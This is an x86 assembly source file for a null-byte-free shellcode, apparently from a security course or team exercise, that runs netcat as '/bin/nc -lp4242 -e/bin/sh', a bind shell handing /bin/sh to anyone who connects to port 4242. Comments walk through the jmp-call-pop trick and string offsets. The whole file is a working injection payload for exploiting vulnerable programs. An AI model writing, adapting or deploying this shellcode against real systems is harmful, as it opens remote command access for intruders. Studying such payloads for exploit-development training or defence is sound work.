; This assembly code translates in C in the form of
; int main() {
;   execve("/bin/nc", {"/bin/nc", "-lp4242", "-e/bin/sh"}, NULL);
; }
;
; We can find syscall numbers in /usr/include/asm/unistd_32.h

section .deadcode exec write                              ; text section writable at runtime
global _start                                             ; export symbol

_start:                                                   ; entrypoint
  jmp short End                                           ; goto End label

Shellcode:
  pop esi                                                 ; esi contain the string in db

  xor eax, eax                                            ; zero eax (used to terminate string and zero out envp)
  mov[esi + 7], al                                        ; null terminate /bin/nc
  mov[esi + 15], al                                       ; null terminate -lp4242
  mov[esi + 25], al                                       ; null terminate -e/bin/sh

  mov[esi + 26], esi                                      ; AAAA is replaced by pointer to "/bin/nc"

  lea ebx, [esi + 8]                                      ; ebx is pointer to "-lp4242"
  mov[esi +30], ebx                                       ; BBBB is replaced by pointer to "-lp4242"

  lea ebx, [esi + 16]                                     ; ebx is pointer to "-e/bin/sh"
  mov[esi + 34], ebx                                      ; CCCC is replaced by pointer to "-e/bin/sh"

  mov[esi + 38], eax                                      ; zero execve envp

  mov al, 11                                              ; execve
  mov ebx, esi                                            ; esi is pointing to "/bin/nc"
  lea ecx, [esi + 26]                                     ; execve argv
  lea edx, [esi + 38]                                     ; execve envp
  int 0x80                                                ; syscall execute

End:
  call Shellcode                                          ; goto Shellcode label
  db '/bin/nc0-lp42420-e/bin/sh0CA647_ELITE_TEAM'         ; avoid (ro)data section. Can't zero data here (avoid null bytes in payload)
  ;   012345678901234567890123456789012345678901         ; esi offset scale
  ;   0         1         2         3         4
